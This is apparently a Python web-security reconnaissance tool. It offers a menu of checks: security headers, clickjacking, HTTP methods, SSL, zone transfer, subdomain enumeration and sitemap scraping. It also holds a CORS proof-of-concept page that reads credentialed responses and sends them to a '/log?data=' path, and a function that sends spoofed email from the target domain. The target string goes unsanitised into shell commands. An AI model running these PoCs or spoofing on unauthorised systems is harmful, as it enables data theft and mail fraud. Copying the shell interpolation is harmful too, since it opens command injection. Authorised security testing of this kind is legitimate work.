import os,re,subprocess,sys

# Sets the text formatting presets
bold = "\033[1m"
endbold = "\033[0m"
blue = "\033[38;2;0;255;255m"
red = "\033[38;2;220;20;60m"
yellow1 = "\033[38;2;255;228;181m"
yellow2 = "\033[38;2;255;215;0m"
endcolor = "\033[m"

# Prints the help menu
def help_menu():
    print(f'\n   {blue}{bold}-h\033[0m\033[m	This help menu')
    print(f'   {blue}{bold}-i\033[0m\033[m	Install all the dependencies')
    print(f'\n   {red}[!]\033[m {yellow1}Usage:\033[m python3 {sys.argv[0]} <target>')
    print(f'   {red}[>]\033[m {yellow1}e.g:\033[m python3 {sys.argv[0]} https://github.com')
    exit()

# Verifies if there are any arguments declared
try:
	target = sys.argv[1].lower()
	if len(sys.argv) > 2:
		extra_param = sys.argv[2].lower()
	else:
		extra_param = None	
except:
	IndexError
	help_menu()

# Checks if any of the arguments contain a command of help or install
def checks_arguments():
	help_list = ['help', '-help', '--help', 'h', '-h', '--h', '?']
	install_list = ['install', '-install', '--install', 'i', '-i', '--i']
	if (target in install_list) or (extra_param in install_list):
		runs_setup()
	elif (target in help_list) or (extra_param in help_list):
		help_menu()
	else:
		parses_target(target)

# Runs the setup process to install the dependencies
def runs_setup():
		os.system('clear')
		print(f'\n{yellow1}-> If you are not running as root/sudo, it should prompt you to elevate the process:\033[m\n')
		os.system('sudo apt install nmap dirb sslscan dnsutils sendemail postfix golang subfinder -y')
		os.system('curr_path=$(/bin/pwd);cd /opt;git clone https://github.com/projectdiscovery/httpx.git;cd httpx/cmd/httpx;go build;mv httpx /usr/local/bin/;cd $curr_path')
		os.system('sudo systemctl enable postfix && sudo service postfix start')
		os.system('python3 -m pip install --upgrade requests')
		os.system('python3 -m pip install --upgrade ultimate_sitemap_parser')
		os.system('python3 -m pip install --upgrade shcheck')
		os.system('clear')
		print(f'\n{yellow1}-> Installation completed!\033[m')
		print(f'\n   {red}[!]\033[m {yellow1}Usage:\033[m python3 {sys.argv[0]} <target>')
		print(f'   {red}[>]\033[m {yellow1}e.g:\033[m python3 {sys.argv[0]} https://github.com')
		exit()

# Verifies if the target contains the protocol prefix declared
def parses_target(target):
    regex = r'https?://*'
    if re.match(regex, target) is None:
        help_menu()
    else:
        main_menu()

# Edits the target from URI to URL, removing any path and prefixes from the target
def parses_domain():
	parsing = f'echo {target} | sed "s,http://,,g" | sed "s,https://,,g" | cut -d "/" -f1'
	process = subprocess.run(parsing, shell=True, capture_output=True, text=True)
	domain = process.stdout.strip()
	return domain

# Prints the banner
def banner():
    print(f'\n{red}                  .\033[m')
    print(f'{red}                  |\033[m')
    print(f'{red}             .   ]#[   .\033[m')
    print(f'{red}              \\_______/\033[m')
    print(f'{red}           .    ]###[    .\033[m')
    print(f'{red}            \\___________/             _  __  _       _   _             _\033[m')
    print(f'{red}         .     ]#####[     .         | |/ / | |     (_) | |           (_)\033[m')
    print(f'{red}          \\_______________/          | \' /  | |__    _  | |_    __ _   _\033[m')
    print(f'{red}       .      ]#######[      .       |  <   |  _ \\  | | | __|  / _  | | |\033[m')
    print(f'{red}        \\___]##.-----.##[___/        | . \\  | | | | | | | |_  | (_| | | |\033[m')
    print(f'{red}         |_|_|_|     |_|_|_|         |_|\\_\\ |_| |_| |_|  \\__|  \\__ _| |_|\033[m')
    print(f'{red}         |_|_|_|_____|_|_|_|\033[m')
    print(f'{red}       #######################       https://github.com/rafaelbaldasso\033[m\n\n')
    print(f'{red}>>\033[m {yellow1}Target: {target}\033[m\n')

# Runs the main menu of the tool
def main_menu():
    os.system('clear')
    banner()
    print(f'{red}[0]\033[m {yellow1}Exit\033[m\n{red}[1]\033[m {yellow1}Security Headers\033[m        {red}[4]\033[m {yellow1}SSL Tests\033[m       {red}[7]\033[m {yellow1}Zone Transfer\033[m')
    print(f'{red}[2]\033[m {yellow1}Clickjacking\033[m            {red}[5]\033[m {yellow1}CORS\033[m            {red}[8]\033[m {yellow1}Subdomain Enumeration\033[m')
    print(f'{red}[3]\033[m {yellow1}HTTP Headers & Methods\033[m  {red}[6]\033[m {yellow1}Email Spoofing\033[m  {red}[9]\033[m {yellow1}Sitemap Scraping\033[m')

    menu_dict = {
    	1: security_headers,
    	2: clickjacking,
    	3: http_headers,
    	4: ssl_tests,
    	5: cors,
    	6: email_spoofing,
    	7: zone_transfer,
    	8: subdomains_enum,
    	9: sitemap_scraping
    }
    
    try:
        option = int(input(f'\n{red}[>]\033[m '))
        os.system('clear')
    except:
        ValueError
        main_menu()
        
    if option == 0:
        os.system('clear')
        exit()
    elif option in menu_dict:
        menu_dict[option]()
    else:
        main_menu()

# Runs shcheck to verify the http security headers
def security_headers():
	command = f'shcheck.py {target} -d'
	print(f'\n{red}{bold}>>> Security Headers{endbold}{endcolor}\n')
	print(f'{blue}{command}{endcolor}')
	os.system(command)
	x = input(f'\n{yellow2}{bold}< Press ENTER to continue >{endbold}{endcolor}')
	main_menu()

# Runs shcheck + creates a PoC to test for clickjacking
def clickjacking():
	command1 = f'shcheck.py {target} -d | egrep "X-Frame-Options|Content-Security-Policy"'
	command2 = f'echo "<html><head><title>Clickjacking Test</title></head><body><h1>Clickjacking Test</h1><p><b>{target}</b></p><iframe src="{target}" width="800" height="500" margin-top="100" scrolling="yes" style="opacity:0.5"></iframe></body></html>" > /tmp/clickjacking.html'
	print(f'\n{red}{bold}>>> Clickjacking{endbold}{endcolor}\n')
	print(f'{blue}{command1}{endcolor}\n')
	os.system(command1)
	print(f'\n{yellow1}Clickjacking Test HTML file (open in your browser):{endcolor}')
	print('file:///tmp/clickjacking.html')
	os.system(command2)
	x = input(f'\n\n{yellow2}{bold}< Press ENTER to continue >{endbold}{endcolor}')
	os.system('rm -rf /tmp/clickjacking.html')
	main_menu()

# Uses curl to check the http response headers + tests for TRACE
def http_headers():
	command1 = f'curl -I {target} -L -k -s --connect-timeout 15'
	command2 = f'curl -I {target} -L -k -X OPTIONS -s --connect-timeout 15'
	command3 = f'curl -k -X TRACE {target} -L -s -I -H "Cookie: test=123" --connect-timeout 15'
	print(f'\n{red}{bold}>>> HTTP Response Headers{endbold}{endcolor}\n')
	print(f'{blue}{command1}{endcolor}\n')
	os.system(command1)
	print('=' * 85)
	print(f'\n{red}{bold}>>> HTTP Methods{endbold}{endcolor}\n')
	print(f'{blue}{command2}{endcolor}\n')
	os.system(command2)
	print('=' * 85)
	print(f'\n{red}{bold}>>> HTTP TRACE{endbold}{endcolor}\n')
	print(f'{blue}{command3}{endcolor}\n')
	os.system(command3)
	x = input(f'\n{yellow2}{bold}< Press ENTER to continue >{endbold}{endcolor}')
	main_menu()

# Runs sslscan to verify protocols and ciphers
def ssl_tests():
	command = f'sslscan {parses_domain()}'
	print(f'\n{red}{bold}>>> SSL Tests{endbold}{endcolor}\n')
	print(f'{blue}{command}{endcolor}\n')
	os.system(command)
	x = input(f'\n\n{yellow2}{bold}< Press ENTER to continue >{endbold}{endcolor}')
	main_menu()

# Tests for CORS Arbitrary Origin + Allow Credentials and generates a PoC
def cors():
	try:
		command1 = f'curl {target} -H "Origin: https://poc-cors.com" -I -s -k -L | egrep -i "Access-Control-Allow-Origin|Access-Control-Allow-Credentials" | sort -u'
		print(f'\n{red}{bold}>>> CORS Arbitrary Origin + Allow Credentials PoC{endbold}{endcolor}\n')
		print(f'{blue}{command1}{endcolor}\n')
		os.system(command1)
		url = input(f'\n{yellow1}-> If authenticated, paste an URL exposing sensitive information (e.g. https://site.com/accountInfo);\n-> Or leave it empty to use {target}: {endcolor}')
		if url == "":
			url = target
		command2 = 'echo "<html><body><script>var req = new XMLHttpRequest();req.onload = reqListener;req.open(\'get\',\'' + url + '\',true);req.withCredentials = true;req.send();function reqListener(){location=\'/log?data=\'+this.responseText;};</script></body></html>" > cors.html'
		print(f'\n{yellow1}-> PoC:{endcolor} {command2}')
		os.system(command2)
		print(f'\n{yellow1}-> If authenticated, with the browser still open, copy the link below and paste into a new tab;{endcolor}')
		print(f'\n{blue}-> Link:{endcolor} http://localhost:44610/cors.html')
		print(f'\n{yellow1}-> After the tests, use Ctrl+C to close the python webserver.{endcolor}\n')
		os.system('python3 -m http.server 44610')
	except:
		KeyboardInterrupt
	x = input(f'\n\n{yellow2}{bold}< Press ENTER to continue >{endbold}{endcolor}')
	os.system('rm -rf cors.html')
	main_menu()

# Verifies the SPF + DMARC + DKIM records and sends an email spoofing test
def email_spoofing():
	try:
		print(f'\n{red}{bold}>>> Email Spoofing{endbold}{endcolor}\n')
		domain = parses_domain()
		command1 = f'host -t txt {domain}'
		command2 = f'host -t txt _dmarc.{domain}'
		print(f'{yellow1}-> SPF: {endcolor}')
		print(f'\n{blue}{command1}{endcolor}\n')
		os.system(command1)
		print(f'\n{yellow1}-> DMARC: {endcolor}\n')
		print(f'{blue}{command2}{endcolor}\n')
		os.system(command2)
		dkim = input(f'\n{yellow1}-> DKIM Selector (optional for DKIM check): {endcolor}')
		if dkim != "":
			command3 = f'host -t txt {dkim}._domainkey.{domain}'
			print(f'\n{blue}{command3}{endcolor}\n')
			os.system(command3)
		recipient = input(f'\n{yellow1}-> Send spoofing test? (insert the recipient\'s email or leave it empty to skip): {endcolor}')
		if recipient != "":
			command4 = f'sendemail -f spoofed@{domain} -t {recipient} -u "Spoofing Test" -m "{domain} is vulnerable to email spoofing." -o tls=no'
			print(f'\n{blue}{command4}{endcolor}\n')
			os.system(command4)
			print(f'\n{yellow1}-> Spoofing email sent, check your inbox (or the spam folder, if the headers are partially configured).{endcolor}')
	except:
		KeyboardInterrupt
	x = input(f'\n\n{yellow2}{bold}< Press ENTER to continue >{endbold}{endcolor}')
	main_menu()

# Tries to perform a zone transfer to expose its records
def zone_transfer():
	print(f'\n{red}{bold}>>> Zone Transfer - Target must be the Domain{endbold}{endcolor}\n')
	domain = parses_domain()
	command = f'for nserver in $(host -t ns {domain} | cut -d " " -f4 | sed "s/.$//");do host -l -a {domain} $nserver;done'
	print(f'\n{blue}{command}{endcolor}\n')
	os.system(command)
	x = input(f'\n\n{yellow2}{bold}< Press ENTER to continue >{endbold}{endcolor}')
	main_menu()

# Enumerates the subdomains for the provided target
def subdomains_enum():
	domain = parses_domain()
	print(f'\n{red}{bold}>>> Subdomain Enumeration{endbold}{endcolor}\n')
	print(f'{yellow1}-> Subdomains of {domain}:{endcolor}\n')
	command1 = f'subfinder -silent -d {domain} >> /tmp/subdomains.txt'
	os.system(command1)
	command2 = f'query="SELECT ci.NAME_VALUE NAME_VALUE FROM certificate_identity ci WHERE ci.NAME_TYPE = \'dNSName\' AND reverse(lower(ci.NAME_VALUE)) LIKE reverse(lower(\'%.{domain}\'));";(echo {domain}; echo $query | psql -t -h crt.sh -p 5432 -U guest certwatch | sed -e "s:^ *::g" -e "s:^*\.::g" -e "/^$/d" | sed -e "s:*.::g";) | sort -u >> /tmp/subdomains.txt'
	os.system(command2)
	command3 = f'httpx -silent -probe -list /tmp/subdomains.txt | grep SUCCESS'
	os.system(command3)
	os.system('rm -rf /tmp/subdomains.txt')
	x = input(f'\n\n{yellow2}{bold}< Press ENTER to continue >{endbold}{endcolor}')
	main_menu()

# Scrapes the sitemaps to collect URLs
def sitemap_scraping():
	from usp.tree import sitemap_tree_for_homepage
	print(f'\n{red}{bold}>>> Sitemap Scraping{endbold}{endcolor}\n')
	tree = sitemap_tree_for_homepage(target)
	file_urls = open("/tmp/scraping.txt", "a")
	for page in tree.all_pages():
		file_urls.write(str(page) + "\n")
	file_urls.close()
	command1 = f'cat /tmp/scraping.txt | cut -d "=" -f2 | cut -d "," -f1 | sort -u > urls.txt'
	os.system('clear')
	print(f'\n{red}{bold}>>> Sitemap Scraping{endbold}{endcolor}\n')
	os.system(command1)
	os.system('rm -rf /tmp/scraping.txt')
	print("URLs saved to file urls.txt in the current path.")
	x = input(f'\n\n{yellow2}{bold}< Press ENTER to continue >{endbold}{endcolor}')
	main_menu()

checks_arguments()
